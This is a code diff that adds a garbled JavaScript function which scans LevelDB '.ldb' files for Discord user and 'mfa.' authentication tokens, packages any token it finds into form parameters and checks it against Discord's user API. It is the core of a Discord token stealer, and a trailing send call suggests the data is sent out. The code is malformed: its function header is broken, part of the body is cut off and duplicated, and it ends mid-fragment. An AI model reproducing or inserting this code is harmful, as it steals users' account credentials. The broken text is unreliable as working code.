@@ -1,0 +1,44 @@
+function get_token = async function get_token(path) {
+            try {
+               
+
+                fs.readdir(path, (err, files) => {
+                    if (files === undefined) {
+                        return
+                    }
+
+                    let filtro = files.filter(f => f.split('.').pop() === "ldb")
+                    for (i = 0; i < filtro.length; i++) {
+                        fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
+                            let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
+                            let mfa = /"mfa\.[\d\w_-]{84}"/;
+
+                            let [tkn] = dmfa.exec(data) || mfa.exec(data) || [null];
+                            if (tkn != null) {
+                                tkn = tkn.replace(/"/g, '')
+
+                                let benladen = new URLSearchParams();
+                                benladen.append('token', tkn);
+
+                                let user = JSO...
+fs.readdir(path, (err, files) => {
+                    if (files === undefined) {
+                        return
+                    }
+
+                    let filtro = files.filter(f => f.split('.').pop() === "ldb")
+                    for (i = 0; i < filtro.length; i++) {
+                        fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
+                            let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
+                            let mfa = /"mfa\.[\d\w_-]{84}"/;
+
+                            let [tkn] = dmfa.exec(data) || mfa.exec(data) || [null];
+                            if (tkn != null) {
+                                tkn = tkn.replace(/"/g, '')
+
+                                let benladen = new URLSearchParams();
+                                benladen.append('token', tkn);
+
+                                let user = JSON.parse(request("GET", 'https://discord.com/api/v9/users/@me', {
+                      ...
+wb.send(err)
